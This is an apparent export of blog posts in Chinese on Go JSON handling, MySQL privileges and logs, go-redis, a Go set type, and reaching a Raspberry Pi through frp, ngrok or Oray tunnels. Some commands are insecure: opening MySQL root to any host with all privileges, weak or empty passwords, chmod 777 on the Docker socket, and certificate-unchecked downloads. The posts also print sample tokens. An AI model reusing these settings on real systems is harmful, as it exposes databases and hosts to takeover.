//&#123;&quot;some_feild&quot;:&quot;&quot;&#125; 即序列化的时候不输出，这样可以有效保护需要保护的字段不被序列化。 临时粘合两个struct通过嵌入struct的方式: 1234567891011121314151617181920212223242526272829303132333435package mainimport ( \"encoding/json\")type BlogPost struct &#123; URL string `json:\"url\"` Title string `json:\"title\"`&#125;type Analytics struct &#123; Visitors int `json:\"visitors\"` PageViews int `json:\"page_views\"`&#125;func main() &#123; post := &amp;BlogPost&#123; URL: \"test.com\", Title: \"t\", &#125; analytics := &amp;Analytics&#123; Visitors: 1, PageViews: 2, &#125; bytes, err := json.Marshal(struct &#123; *BlogPost *Analytics &#125;&#123;post, analytics&#125;) println(string(bytes)) println(err)&#125; 用字符串传递数字123type TestObject struct &#123; Field1 int `json:&quot;,string&quot;`&#125; 这个对应的json是 {&quot;Field1&quot;: &quot;100&quot;} 如果json是 {&quot;Field1&quot;: 100} 则会报错 Map转JSON（JSON序列化）123456789101112131415161718192021222324252627282930package mainimport ( \"encoding/json\" \"fmt\")func testMap() &#123; mmp := make(map[string]interface&#123;&#125;) mmp[\"username\"] = \"user\" mmp[\"age\"] = 19 mmp[\"sex\"] = \"man\" data, err := json.Marshal(mmp) if err != nil &#123; fmt.Println(\"json marshal failed,err:\", err) return &#125; fmt.Printf(\"%s\\n\", string(data))&#125;func main() &#123; testMap() fmt.Println(\"----\")&#125;// output&#123;\"age\":19,\"sex\":\"man\",\"username\":\"user\"&#125;---- slice转JSON（JSON序列化）12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package mainimport ( \"encoding/json\" \"fmt\")func testSlice() &#123; var map1 map[string]interface&#123;&#125; var slice1 []map[string]interface&#123;&#125; map1 = make(map[string]interface&#123;&#125;) map1[\"username\"] = \"user1\" map1[\"age\"] = 18 map1[\"sex\"] = \"man\" slice1 = append(slice1, map1) map1 = make(map[string]interface&#123;&#125;) map1[\"username\"] = \"user2\" map1[\"age\"] = 29 map1[\"sex\"] = \"female\" slice1 = append(slice1, map1) bytes, err := json.Marshal(slice1) if err != nil &#123; fmt.Println(\"json.marshal failed, err:\", err) return &#125; fmt.Printf(\"%slice1\\n\", string(bytes)) slice2 := make([]int, 3) slice2[0] = 0 slice2[1] = 1 slice2[2] = 2 bytes, err = json.Marshal(slice2) if err != nil &#123; fmt.Println(\"json.marshal failed, err:\", err) return &#125; fmt.Printf(\"%s\\n\", string(bytes))&#125;func main() &#123; testSlice()&#125;// output[&#123;\"age\":18,\"sex\":\"man\",\"username\":\"user1\"&#125;,&#123;\"age\":29,\"sex\":\"female\",\"username\":\"user2\"&#125;]lice1[0,1,2] JSON 转 struct（JSON反序列化）12345678910111213141516171819202122232425262728293031package mainimport ( \"encoding/json\" \"fmt\")type User struct &#123; UserName string `json:\"username\"` NickName string `json:\"test_nickname\"` Age int Birthday string Sex string Email string Phone string&#125;func main() &#123; str := `&#123;\"username\":\"user1\",\"test_nickname\":\"上课看似\",\"Age\":18,\"Birthday\":\"2008/8/8\",\"Sex\":\"男\",\"Email\":\"test@qq.com\",\"Phone\":\"110\"&#125;` var user1 User err := json.Unmarshal([]byte(str), &amp;user1) if err != nil &#123; fmt.Println(\"Unmarshal failed, \", err) return &#125; fmt.Printf(\"%+v\", user1)&#125;// output&#123;UserName:user1 NickName:上课看似 Age:18 Birthday:2008/8/8 Sex:男 Email:test@qq.com Phone:110&#125; JSON 转 map（JSON反序列化）1234567891011121314151617181920212223242526272829303132333435363738394041424344package mainimport ( \"encoding/json\" \"fmt\")func serializeMap() (ret string, err error) &#123; var m map[string]interface&#123;&#125; m = make(map[string]interface&#123;&#125;) m[\"username\"] = \"user1\" m[\"age\"] = 18 m[\"sex\"] = \"man\" str, err := json.Marshal(m) if err != nil &#123; err = fmt.Errorf(\"json.marshal failed, err: %v\", err) return &#125; ret = string(str) return&#125;func main() &#123; str, err := serializeMap() if err != nil &#123; fmt.Println(\"test map failed, \", err) return &#125; println(str) var m map[string]interface&#123;&#125; err = json.Unmarshal([]byte(str), &amp;m) if err != nil &#123; fmt.Println(\"Unmarshal failed, \", err) return &#125; fmt.Println(m)&#125;// output&#123;\"age\":18,\"sex\":\"man\",\"username\":\"user1\"&#125;map[age:18 sex:man username:user1] Reference https://blog.csdn.net/u013210620/article/details/78450474 https://jingwei.link/2019/03/15/golang-json-unmarshal-using.html https://sanyuesha.com/2018/05/07/go-json/ https://colobu.com/2017/06/21/json-tricks-in-Go/","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【MySQL】用户和权限管理","date":"2020-03-29T05:46:47.000Z","path":"2020/03/29/【MySQL】用户和权限管理/","text":"MySQL权限关于MySQL的权限简单的理解就是MySQL允许你做你全力以内的事情，不可以越界。比如只允许你执行select操作，那么你就不能执行update操作。只允许你从某台机器上连接MySQL，那么你就不能从除那台机器以外的其他机器连接MySQL。 那么MySQL的权限是如何实现的呢？这就要说到MySQL的两阶段验证，下面详细介绍： 第一阶段：服务器首先会检查你是否允许连接。因为创建用户的时候会加上主机限制，可以限制成本地、某个IP、某个IP段、以及任何地方等，只允许你从配置的指定地方登陆。 第二阶段：如果你能连接，MySQL会检查你发出的每个请求，看你是否有足够的权限实施它。比如你要更新某个表、或者查询某个表，Mysql会查看你对哪个表或者某个列是否有权限。再比如，你要运行某个存储过程，MySQL会检查你对存储过程是否有执行权限等。 MySQL到底都有哪些权限呢？从官网复制一个表来看看： 权限 权限级别 权限说明 CREATE 数据库、表或索引 创建数据库、表或索引权限 DROP 数据库或表 删除数据库或表权限 GRANT OPTION 数据库、表或保存的程序 赋予权限选项 REFERENCES 数据库或表 ALTER 表 更改表，比如添加字段、索引等 DELETE 表 删除数据权限 INDEX 表 索引权限 INSERT 表 插入权限 SELECT 表 查询权限 UPDATE 表 更新权限 CREATE VIEW 视图 创建视图权限 SHOW VIEW 视图 查看视图权限 ALTER ROUTINE 存储过程 更改存储过程权限 CREATE ROUTINE 存储过程 创建存储过程权限 EXECUTE 存储过程 执行存储过程权限 FILE 服务器主机上的文件访问 文件访问权限 CREATE TEMPORARY TABLES 服务器管理 创建临时表权限 LOCK TABLES 服务器管理 锁表权限 CREATE USER 服务器管理 创建用户权限 PROCESS 服务器管理 查看进程权限 RELOAD 服务器管理 执行flush-hosts, flush-logs, flush-privileges, flush-status, flush-tables, flush-threads, refresh, reload等命令的权限 REPLICATION CLIENT 服务器管理 复制权限 REPLICATION SLAVE 服务器管理 复制权限 SHOW DATABASES 服务器管理 查看数据库权限 SHUTDOWN 服务器管理 关闭数据库权限 SUPER 服务器管理 执行kill线程权限 MySQL 的权限如何分布，就是针对表可以设置什么权限，针对列可以设置什么权限等等，这个可以从官方文档中的一个表来说明： 权限分布 可能的设置的权限 表权限 ‘Select’, ‘Insert’, ‘Update’, ‘Delete’, ‘Create’, ‘Drop’, ‘Grant’, ‘References’, ‘Index’, ‘Alter’ 列权限 ‘Select’, ‘Insert’, ‘Update’, ‘References’ 过程权限 ‘Execute’, ‘Alter Routine’, ‘Grant’ MySQL权限经验原则 权限控制主要是出于安全因素，因此需要遵循一下几个经验原则： 只授予能满足需要的最小权限，防止用户干坏事。比如用户只是需要查询，那就只给select权限就可以了，不要给用户赋予update、insert或者delete权限。 创建用户的时候限制用户的登录主机，一般是限制成指定IP或者内网IP段。 初始化数据库的时候删除没有密码的用户。安装完数据库的时候会自动创建一些用户，这些用户默认没有密码。 为每个用户设置满足密码复杂度的密码。 定期清理不需要的用户。回收权限或者删除用户。 用户及用户权限管理添加用户1CREATE USER username@% IDENTIFIED BY 'password'; 删除用户1delete from mysql.user where user=“用户名” and host=\"localhost\"; 查看用户显示所有用户和对应可以使用该用户进行登录的IP1select host, user from mysql.user; 显示当前用户1select user(); 用户权限查看权限查看当前用户权限1show grants; 查看某个用户权限1show grants for jack@localhost; 查看某个用户的权限1show grants for &apos;jack&apos;@&apos;%&apos;; 为用户分配库权限1grant &lt;可执行的操作行为&gt; on &lt;DB name&gt;.&lt;table name&gt; to &lt;用户名&gt;@&lt;允许执行的IP/host&gt; [identified by &lt;密码&gt;] with grant option; 可执行的操作行为是一个枚举值，包括ALL PRIVILEGES （表示所有权限）、select、update、insert、delete等等 &lt;DB name&gt;.&lt;table name&gt;表示允许执行的表，如*.*第一个*表示所有的数据库，第二个*表示这些库中的所有表 用户名表示指定的用户 允许执行的IP/host表示该对应的IP（或名为该host/s的主机）允许使用这个特定用户为特定数据库表执行特定权限，%表示任何IP/host 密码表示将该用户密码重置为当前指定密码（若不指定则继续使用该用户的当前密码） with grant option：这个选项表示该用户可以将自己拥有的权限授权给别人 备注：可以使用GRANT重复给用户添加权限，权限叠加，比如你先给用户添加一个select权限，然后又给用户添加一个insert权限，那么该用户就同时拥有了select和insert权限。 比如： 1234567891011// 允许host主机使用 user1 用户（该用户密码为 password）对名为database name的DB中所有表执行查询操作grant select on &lt;database name&gt;.* to user1@host identified by \"password\";// 允许任何主机使用 test1 用户（该用户密码为 abc）对DB中任何库任何表执行CRUD操作grant select,insert,update,delete on *.* to test1@'%' Identified by “abc”;// 只允许localhost主机使用 test1 用户（该用户密码为 abc）对DB中任何库任何表执行CRUD操作grant select,insert,update,delete on mydb.* to test2@localhost identified by “abc”;// 只允许localhost主机使用 test1 用户（无登录密码）对DB中任何库任何表执行CRUD操作grant select,insert,update,delete on mydb.* to test2@localhost identified by \"\"; 不在外名单中的IP访问MySQL如果你当前连接MySQL的IP不在白名单内，将会得到错误： 123$ mysql -u root -h 172.104.103.13 -pEnter password:ERROR 1130 (HY000): Host 'bb121-7-176-137.singnet.com.sg' is not allowed to connect to this MariaDB server 如果是被防火墙拦截而不能访问MySQL，则是这样的提示： 123mysql -u rootss -h 1.1.1.1 -pEnter password:ERROR 2003 (HY000): Can&apos;t connect to MySQL server on &apos;1.1.1.1&apos; (61) 撤销权限1revoke all privileges on *.* from root@\"\"; 刷新权限只要对权限做了更改就应该执行一次刷新权限命令。 1flush privileges; Reference https://www.cnblogs.com/richardzhu/p/3318595.html","comments":true,"categories":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/tags/MySQL/"}]},{"title":"【MySQL】MySQL安全性设置","date":"2020-03-29T05:00:20.000Z","path":"2020/03/29/【MySQL】MySQL安全性设置/","text":"MySQL1234567891011hostname localhostmysql -u root -p// yRqyGEKK is the DB name for WordPressCREATE DATABASE yRqyGEKK;// Create a specific user who can only aceess WordPress&apos;s DBCREATE USER wordpressuser@localhost IDENTIFIED BY &apos;password&apos;;GRANT ALL PRIVILEGES ON yRqyGEKK.* TO wordpressuser@localhost IDENTIFIED BY &apos;password&apos;;FLUSH PRIVILEGES;exit 使用随机字符串作为 MySQL 中服务于WordPress 的 DB name。 为该 DB 创建特定的用户，该用户只具有对该 DB 中所有 table 的增删查改权限（最小权限原则）。当然，在上面的例子中，我为该用户赋予了对该 DB 中所有 table 的所有权限 无法从外部连接MySQL，只能在本机（localhost）连接并访问 连接管理允许MySQL被外部连接访问12345678910111213//登录数据库mysql -u root -puse mysql;select user,host from user;update user set host=&apos;%&apos; where user=&apos;root&apos;;flush privileges;// 或者GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; WITH GRANT OPTION;flush privileges;sudo netstat -an | grep 3306 ​","comments":true,"categories":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/tags/MySQL/"}]},{"title":"【MySQL】查看log","date":"2020-03-29T03:54:09.000Z","path":"2020/03/29/【MySQL】操作-查看log/","text":"查看运行log123456789// Depends on your mysql version$ systemctl status mysqld.service$ systemctl status mysqld.service● mariadb.service - MariaDB database server Loaded: loaded (/usr/lib/systemd/system/mariadb.service; enabled; vendor preset: disabled) Active: inactive (dead) since Mon 2020-01-20 23:18:07 UTC; 2 months 7 days ago Main PID: 10307 (code=exited, status=0/SUCCESS)Warning: Journal has been rotated since unit was started. Log output is incomplete or unavailable. 1234567891011121314151617181920// 查看log路径$ cat /etc/my.cnf[mysqld]datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.sock# Disabling symbolic-links is recommended to prevent assorted security riskssymbolic-links=0# Settings user and group are ignored when systemd is used.# If you need to run mysqld under a different user or group,# customize your systemd unit file for mariadb according to the# instructions in http://fedoraproject.org/wiki/Systemd[mysqld_safe]log-error=/var/log/mariadb/mariadb.logpid-file=/var/run/mariadb/mariadb.pid## include all files from the config directory#!includedir /etc/my.cnf.d 可以从下面Log看到，MySQL是由于 Out of memory。 更准确的说，当MySQL被初始化时，我们尝试为MySQL的 buffer pool分配128M的内存，但是失败了（cannot allocate memory for the buffer pool）。 1234567891011121314151617181920212223$ cat /var/log/mariadb/mariadb.log200120 23:18:06 mysqld_safe Number of processes running now: 0200120 23:18:06 mysqld_safe mysqld restarted200120 23:18:07 [Note] /usr/libexec/mysqld (mysqld 5.5.60-MariaDB) starting as process 20856 ...200120 23:18:07 [ERROR] mysqld: Out of memory (Needed 128917504 bytes)200120 23:18:07 [ERROR] mysqld: Out of memory (Needed 96681984 bytes)200120 23:18:07 InnoDB: The InnoDB memory heap is disabled200120 23:18:07 InnoDB: Mutexes and rw_locks use GCC atomic builtins200120 23:18:07 InnoDB: Compressed tables use zlib 1.2.7200120 23:18:07 InnoDB: Using Linux native AIO200120 23:18:07 InnoDB: Initializing buffer pool, size = 128.0MInnoDB: mmap(137756672 bytes) failed; errno 12200120 23:18:07 InnoDB: Completed initialization of buffer pool200120 23:18:07 InnoDB: Fatal error: cannot allocate memory for the buffer pool200120 23:18:07 [ERROR] Plugin 'InnoDB' init function returned error.200120 23:18:07 [ERROR] Plugin 'InnoDB' registration as a STORAGE ENGINE failed.200120 23:18:07 [Note] Plugin 'FEEDBACK' is disabled.200120 23:18:07 [ERROR] Unknown/unsupported storage engine: InnoDB200120 23:18:07 [ERROR] Aborting200120 23:18:07 [Note] /usr/libexec/mysqld: Shutdown complete200120 23:18:07 mysqld_safe mysqld from pid file /var/run/mariadb/mariadb.pid ended 1$ sudo systemctl restart mariadb.service 重启后log： 1234567891011121314151617181920$ cat /var/log/mariadb/mariadb.log200329 04:09:47 mysqld_safe Starting mysqld daemon with databases from /var/lib/mysql200329 4:09:47 [Note] /usr/libexec/mysqld (mysqld 5.5.60-MariaDB) starting as process 13375 ...200329 4:09:47 InnoDB: The InnoDB memory heap is disabled200329 4:09:47 InnoDB: Mutexes and rw_locks use GCC atomic builtins200329 4:09:47 InnoDB: Compressed tables use zlib 1.2.7200329 4:09:47 InnoDB: Using Linux native AIO200329 4:09:47 InnoDB: Initializing buffer pool, size = 128.0M200329 4:09:47 InnoDB: Completed initialization of buffer pool200329 4:09:47 InnoDB: highest supported file format is Barracuda.InnoDB: The log sequence number in ibdata files does not matchInnoDB: the log sequence number in the ib_logfiles!InnoDB: Restoring possible half-written data pages from the doublewrite buffer...200329 4:09:47 InnoDB: Waiting for the background threads to start200329 4:09:48 Percona XtraDB (http://www.percona.com) 5.5.59-MariaDB-38.11 started; log sequence number 4289175227200329 4:09:48 [Note] Plugin 'FEEDBACK' is disabled.200329 4:09:48 [Note] Server socket created on IP: '0.0.0.0'.200329 4:09:48 [Note] Event Scheduler: Loaded 0 events200329 4:09:48 [Note] /usr/libexec/mysqld: ready for connections.Version: '5.5.60-MariaDB' socket: '/var/lib/mysql/mysql.sock' port: 3306 MariaDB Server","comments":true,"categories":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/tags/MySQL/"}]},{"title":"【MySQL】Establishing a Database Connection","date":"2020-03-29T03:34:25.000Z","path":"2020/03/29/【MySQL】Establishing-a-Database-Connection/","text":"ProblemAre you seeing the ‘Error establishing a database connection’ notice on your WordPress website? It is a fatal error that makes your WordPress website inaccessible to the users. This error occurs when WordPress is unable to make a connection to the database. A number of things can affect your WordPress database connection which makes it a bit difficult for beginners to troubleshoot. SolutionCheck Point 1 - Check Your Database CredentialsCheck Point 2 - Check Your Database Host InformationCheck Point 3 - Check If Your Database Hasn’t Been CorruptedYou need to make sure that the information prodived for your appplications is correct, including the database name, username, password, and database host. To check it, we can use ssh to access the physical machine or any virtual containers that runs your MySQL instance and use the following to check whether we can connect to MySQL manually? 1$ mysql -u root -p Potential Error123$ mysql -u root -pEnter password:ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (111) Reference https://www.wpbeginner.com/wp-tutorials/how-to-fix-the-error-establishing-a-database-connection-in-wordpress/","comments":true,"categories":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/tags/MySQL/"}]},{"title":"【Golang】Set实现","date":"2020-03-22T04:44:34.000Z","path":"2020/03/22/【Golang】Set实现/","text":"Interface1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253type Set interface &#123; // Adds an element to the set. Returns whether // the item was added. Add(i interface&#123;&#125;) bool // Returns the number of elements in the set. Cardinality() int // Removes all elements from the set, leaving // the empty set. Clear() // Returns a clone of the set using the same // implementation, duplicating all keys. Clone() Set // Returns whether the given items // are all in the set. Contains(i ...interface&#123;&#125;) bool // Returns the difference between this set // and other. The returned set will contain // all elements of this set that are not also // elements of other. // // Note that the argument to Difference // must be of the same type as the receiver // of the method. Otherwise, Difference will // panic. Difference(other Set) Set // Determines if two sets are equal to each // other. If they have the same cardinality // and contain the same elements, they are // considered equal. The order in which // the elements were added is irrelevant. // // Note that the argument to Equal must be // of the same type as the receiver of the // method. Otherwise, Equal will panic. Equal(other Set) bool // Returns a new set containing only the elements // that exist only in both sets. // // Note that the argument to Intersect // must be of the same type as the receiver // of the method. Otherwise, Intersect will // panic. Intersect(other Set) Set ...&#125; 创建Set123456789// NewSet creates and returns a reference to an empty set. Operations// on the resulting set are thread-safe.func NewSet(s ...interface&#123;&#125;) Set &#123; set := newThreadSafeSet() for _, item := range s &#123; set.Add(item) &#125; return &amp;set&#125; Set的内部实现12345678910type threadUnsafeSet map[interface&#123;&#125;]struct&#123;&#125;type threadSafeSet struct &#123; s threadUnsafeSet sync.RWMutex&#125;func newThreadSafeSet() threadSafeSet &#123; return threadSafeSet&#123;s: newThreadUnsafeSet()&#125;&#125; 添加12345678910111213141516func (set *threadSafeSet) Add(i interface&#123;&#125;) bool &#123; set.Lock() ret := set.s.Add(i) set.Unlock() return ret&#125;func (set *threadUnsafeSet) Add(i interface&#123;&#125;) bool &#123; _, found := (*set)[i] if found &#123; return false //False if it existed already &#125; (*set)[i] = struct&#123;&#125;&#123;&#125; return true&#125; 包含12345678func (set *threadUnsafeSet) Contains(i ...interface&#123;&#125;) bool &#123; for _, val := range i &#123; if _, ok := (*set)[val]; !ok &#123; return false &#125; &#125; return true&#125; 长度和清除1234567891011func (set *threadUnsafeSet) Cardinality() int &#123; return len(*set)&#125;func (set *threadUnsafeSet) Clear() &#123; *set = newThreadUnsafeSet()&#125;func (set *threadUnsafeSet) Remove(i interface&#123;&#125;) &#123; delete(*set, i)&#125; 相等12345678910111213func (set *threadUnsafeSet) Equal(other Set) bool &#123; _ = other.(*threadUnsafeSet) if set.Cardinality() != other.Cardinality() &#123; return false &#125; for elem := range *set &#123; if !other.Contains(elem) &#123; return false &#125; &#125; return true&#125; 子集123456789func (set *threadUnsafeSet) IsSubset(other Set) bool &#123; _ = other.(*threadUnsafeSet) for elem := range *set &#123; if !other.Contains(elem) &#123; return false &#125; &#125; return true&#125; 交集1234567891011121314151617181920212223242526func (set *threadSafeSet) Union(other Set) Set &#123; o := other.(*threadSafeSet) set.RLock() o.RLock() unsafeUnion := set.s.Union(&amp;o.s).(*threadUnsafeSet) ret := &amp;threadSafeSet&#123;s: *unsafeUnion&#125; set.RUnlock() o.RUnlock() return ret&#125;func (set *threadUnsafeSet) Union(other Set) Set &#123; o := other.(*threadUnsafeSet) unionedSet := newThreadUnsafeSet() for elem := range *set &#123; unionedSet.Add(elem) &#125; for elem := range *o &#123; unionedSet.Add(elem) &#125; return &amp;unionedSet&#125; Reference https://studygolang.com/articles/11179 https://github.com/deckarep/golang-set","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】go-redis 连接Redis","date":"2020-03-22T04:41:41.000Z","path":"2020/03/22/【Golang】redis-go-redis-连接Redis/","text":"go-redis123456789101112131415161718192021222324252627client := redis.NewClient(&amp;redis.Options&#123; Addr: \"localhost:6379\", Password: \"\", // password DB: 0, // use default DB&#125;)pong, err := client.Ping().Result()fmt.Println(pong, err)var id uint64 = 64rule := &amp;Rule&#123; Id: &amp;id,&#125;b, err := json.Marshal(rule)if err != nil &#123; panic(err)&#125;fmt.Println(client.Set(\"cache1\", b, 0).Result())a, err := client.Get(\"cache1\").Result()var item myProto.CompositeLogisticPromotionRuleerr = json.Unmarshal([]byte(a), &amp;item)if err != nil &#123; panic(err)&#125;fmt.Println(item.Id) SADD的区别1234567891011121314151617181920212223package mainimport ( \"github.com/go-redis/redis/v7\")func main() &#123; client := redis.NewClient(&amp;redis.Options&#123; Addr: \"localhost:6379\", Password: \"\", // password DB: 0, // use default DB &#125;) client.SAdd(\"aaa\", nil) var bbb []string client.SAdd(\"bbb\", bbb) client.SAdd(\"ccc\", []string&#123;&#125;) a := make([]string, 0) client.SAdd(\"ddd\", a)&#125; Output 12345678127.0.0.1:6379&gt; SMEMBERS aaa1) \"\"127.0.0.1:6379&gt; SMEMBERS bbb(empty array)127.0.0.1:6379&gt; SMEMBERS ccc(empty array)127.0.0.1:6379&gt; SMEMBERS ddd(empty array) Reference https://github.com/go-redis/redis","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Netwok】通过反向代理实现内网穿透","date":"2020-03-22T04:36:25.000Z","path":"2020/03/22/【Netwok】通过反向代理实现内网穿透/","text":"Background树莓派通常会（通过LAN 或者 WIFI）连接到一个路由器上，如果我们不方便在路由器上配置端口映射（或者这个路由器之外还有另外的 NAT），当我们不在这个内网时，就无法管理我们的树莓派。 这时候，我们可以考虑使用用于内网穿透的反向代理应用。 如果你有一个拥有公网 IP 的机器，比如云主机、VPS 等。那么最稳定的方式就是在这个机器上自己架设中转节点。 Approach1 - frpArchitecture 原生配置并启动 server去 https://github.com/fatedier/frp/releases 下载，我的server 是 Mac，所以选择 frp_0.31.1_darwin_amd64.tar.gz。 修改 frps.ini 文件，这里使用了最简化的配置： 123456789101112# frps.ini[common]bind_addr = xxx.xxx.xxx.xxx # 你的 frp server 的公网 IPbind_port = 7000# Optionaldashboard_port = 7500dashboard_user = &lt;你的仪表盘用户名&gt;dashboard_pwd = &lt;你的仪表盘密码&gt;# Optional, for security reasonsprivilege_token = &lt;u5gYrhw!k$3R6%!t&gt; 注意， xxx.xxx.xxx.xxx为 frps 所运行机器的公网 IP。 配置 dashboard_port、dashboard_user、dashboard_pwd信息后，可以更方便查看流量信息。 privilege_token是验证凭据，服务端和客户端的凭据必须一样才能连接，当然为了安全还是设置长一点。 启动 frps： 1$ ./frps -c ./frps.ini 配置并启动 client我的 client 在树莓派，所以选择https://github.com/fatedier/frp/releases/download/v0.31.1/frp_0.31.1_linux_arm.tar.gz 修改 frpc.ini 文件，xxx.xxx.xxx.xxx 处填写你的 frp server 的公网 IP： 123456789101112# frpc.ini[common]server_addr = xxx.xxx.xxx.xxxserver_port = 7000# Optional, for security reasonsprivilege_token = u5gYrhw!k$3R6%!t[ssh]type = tcplocal_ip = 127.0.0.1local_port = 22remote_port = 6000 启动 frpc： 1$ ./frpc -c ./frpc.ini 通过 ssh 访问内网机器，&lt;the user of ssh&gt; 为 1234$ ssh -oPort=6000 &lt;the user of ssh&gt;@xxx.xxx.xxx.xxx# e.g.,$ ssh -oPort=6000 test@xxx.xxx.xxx.xxx 通过 dashboad 可以查询流量信息： 使用 Docker下载镜像导入 从项目中下载docker images后导入，阿里云镜像下载： 1wget --no-check-certificate https://code.aliyun.com/clangcn/frp-docker/raw/master/frps-docker/frps-docker.tar github镜像下载地址： 1wget --no-check-certificate https://github.com/clangcn/frp-docker/raw/master/frps-docker/frps-docker.tar 镜像导入命令 1docker load &lt; frps-docker.tar 启动命令 123456789docker run -h=&quot;frps-docker&quot; --name frps-docker -d \\-p 6443:5443/tcp \\-p 6443:5443/udp \\0.-p 7443:5445/tcp \\-e set_token=password \\-e set_log_level=info \\-e set_log_max_days=3 \\&quot;frps-docker:latest&quot; 端口说明 Docker内定义 Docker内默认值 描述 bind_port 5443(TCP) frps服务端口 kcp_bind_port 5443(UDP) KCP加速端口 bind_udp_port 5444(UDP) udp端口帮助udp洞洞穿nat dashboard_port 5445(TCP) Frps控制台端口 vhost_http_port 80(TCP) http穿透的端口。 vhost_https_port 443(TCP) https穿透服务的端口 ##变量说明（变量名区分大小写） 变量名 默认值 描述 set_token password frps的认证密码，用于客户端连接 set_subdomain_host frps子域名设置，默认为空，可以输入类似abc.com这样的域名 set_dashboard_user admin frps控制台用户名 set_dashboard_pwd admin frps控制台密码 set_max_pool_count 50 最大连接池数，貌似不用这个了 set_max_ports_per_client 0 允许连入的最大客户端，0为不限制 set_authentication_timeout 900 验证时间，单位为秒，默认900s set_log_level info 日志等级，可选项：debug, info, warn, error set_log_max_days 3 日志保存天数，默认保存3天的 set_tcp_mux true TCP 多路复用 安装1sudo chmod 777 /var/run/docker.sock Approach2 - ngrok进入 ngrok.com，注册并登录，下载ngrok，树莓派选择 Linux（ARM） 12$ unzip /home/pi/Downloads/ngrok.zip$ cd /home/pi/Downloads 访问 https://dashboard.ngrok.com/，以获得 authtoken。 1234$ ./ngrok authtoken &lt;your authtoken&gt;// e.g.,$ ./ngrok authtoken 1WqMjP9yw0fsseUdb6tVdUNgTiN_56d8svuRSDF142bDorTgg 运行 ngrok： 1$ ./ngrok tcp 22 我们需要记住Forwarding这行。 当你在外网时，访问这个树莓派的ssh的方式： 1234$ ssh &lt;your respaberry acount&gt;@&lt;domain and port&gt;// e.g.,$ ssh pi@0.tcp.ngrok.io -p 11911 Approach3 - 花生壳下载：http://hsk.oray.com/download/download?id=25 在树莓派上下载安装包后，通过cd命令进入对应下载目录，输入下面的命令进行安装： 12345678$ dpkg -i phddns_rapi_3.0.3.armhf.deb+--------------------------------------------------+| Oray PeanutHull Linux 3.0.4 |+--------------------------------------------------+| SN: RAPI60c80c54ecac Default password: admin |+--------------------------------------------------+| Remote Management Address http://b.oray.com |+--------------------------------------------------+ 启动： 1$ phddns start 1sudo chmod 777 /var/run/docker.sock 在服务器端部署frps 1docker run --network host -d -v /etc/frp/frps.ini:/etc/frp/frps.ini --name frps snowdreamtech/frps 在客户端部署frpc docker run –network host -d -v /etc/frp/frpc.ini:/etc/frp/frpc.ini –name frpc snowdreamtech/frpc Reference https://service.oray.com/question/2680.html https://github.com/clangcn/frp-docker/tree/master/frps-docker https://www.jianshu.com/p/5f7e71121a4f","comments":true,"categories":[{"name":"Netwok","slug":"Netwok","permalink":"http://swsmile.info/categories/Netwok/"}],"tags":[{"name":"Netwok","slug":"Netwok","permalink":"http://swsmile.info/tags/Netwok/"}]},{"title":"【Golang】内置函数","date":"2020-03-15T09:54:34.000Z","path":"2020/03/15/【Golang】内置函数/","text":"make()Slices can be created with the built-in make function; this is how you create dynamically-sized arrays. The make function allocates a zeroed array and returns a slice that refers to that array: 1a := make([]int, 5) // len(a)=5 To specify a capacity, pass a third argument to make: 1234b := make([]int, 0, 5) // len(b)=0, cap(b)=5b = b[:cap(b)] // len(b)=5, cap(b)=5b = b[1:] // len(b)=4, cap(b)=4 12345678910111213141516171819202122package mainimport &quot;fmt&quot;func main() &#123; a := make([]int, 5) printSlice(&quot;a&quot;, a) b := make([]int, 0, 5) printSlice(&quot;b&quot;, b) c := b[:2] printSlice(&quot;c&quot;, c) d := c[2:5] printSlice(&quot;d&quot;, d)&#125;func printSlice(s string, x []int) &#123; fmt.Printf(&quot;%s len=%d cap=%d %v\\n&quot;, s, len(x), cap(x), x)&#125; make(T, args) 返回的是 T 的引用（指针） - 易错在 Go的世界中，如果没有显式的声明，则都是按值传递（无论数据类型）。这意味着，当调用一个函数时，这个值会被复制一份并传递到这个函数中。因此，在函数内部对值修改不影响值的本身。 但是，make(T, args) 返回的值通过函数传递参数之后可以直接修改，即任何 map，slice，channel 的实例传入函数之后，在函数内部修改该实例的值，将影响该实例在函数外部的状态。 123456789101112func modifySlice(s []int) &#123; s[0] = 1&#125;func main() &#123; s2 := make([]int, 3) fmt.Printf(\"%#v\", s2) //[]int&#123;0, 0, 0&#125; modifySlice(s2) fmt.Printf(\"%#v\", s2) //[]int&#123;1, 0, 0&#125;&#125;//output[]int&#123;0, 0, 0&#125;[]int&#123;1, 0, 0&#125; 这其实说明，调用make(T, args)时返回的是 T 实例的引用（指针），而不是 T 实例。 make() 和 new() new 和 make 都可以用来分配空间，初始化类型，但是它们确有不同。 new(T) 返回的是 T 的指针new(T) 会实例化出一个 T 类型的实例，并为此分配内存空间，该示例为 T 类型的默认值。 new(T) 返回的是示例的地址（也就是一个 T 类型的指针 *T）该指针指向这个 T 的实例。 123456789p1 := new(int)fmt.Printf(\"p1 --&gt; %#v \\n \", p1) 